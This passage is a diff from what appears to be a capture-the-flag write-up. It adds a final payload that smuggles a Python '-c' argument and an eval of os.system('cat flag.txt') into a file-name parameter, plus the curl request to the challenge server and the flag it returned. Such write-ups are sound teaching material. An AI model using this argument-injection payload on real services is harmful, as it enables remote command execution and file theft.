@@ -61,7 +61,18 @@ def run_code():
 
 ![image](https://github.com/user-attachments/assets/f3f2a683-94ad-4c3e-9a4d-84e2480f27a4)
 
-- 
+- Final Payload-:
+```
+-c%0aeval(\"__import__(\'os\').system('cat%20flag.txt')\")%23.py
+```
 
+- Flag-: ```gdscCTF{l0l_tw34k1ng_withSubpr0c3ss}```
+
+```zsh
+curl -G https://chall1.pxxl.xyz/run_file -d "code=-c%0aeval(\"__import__(\'os\').system('cat%20flag.txt')\")%23.py"
+{"result":"gdscCTF{l0l_tw34k1ng_withSubpr0c3ss}\n"}
+```
+
+----------------
 
 
